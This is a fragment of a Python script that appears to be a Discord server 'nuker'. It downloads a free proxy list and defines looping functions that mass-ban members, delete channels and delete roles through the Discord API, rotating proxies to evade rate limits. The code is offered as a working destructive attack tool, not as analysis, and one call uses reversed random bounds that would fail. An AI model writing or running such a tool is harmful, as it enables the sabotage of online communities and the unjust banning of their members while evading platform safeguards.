...
out_file = "proxies/proxies.txt"
f = open(out_file,'wb')
itachi1 = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all")
f.write(itachi1.content)
f.close()
...
try:
    ...
    print(f"{Fore.green}Failed To Load Proxies From Proxies.txt")



def ban(i):
    while True:
      r = requests.put(f"https://discord.com/api/v{randint(9,8)}/guilds/{guild}/bans/{i}", headers=headers, proxies={"http": 'http://' + next(rotating)})
...
def channel_delete(u):
    while True:
       r = requests.delete(f"https://discord.com/api/v8/channels/{u}", headers=headers, proxies={"http": 'http://' + next(rotating)})
       if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
            print(f"Got ratelimited, retrying after: {r.json()['retry_after']} s.")
       else:
...
def role(k):
    while True:
       r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{k}", headers=headers, proxies={"http": 'http://' + next(rotating)})
       if 'retry_after' in r.text:
           time.sleep(r.json()['retry_after'])
           print(f"Got ratelimited, retrying after: {r.json()['retry_after']} s.")
       else:
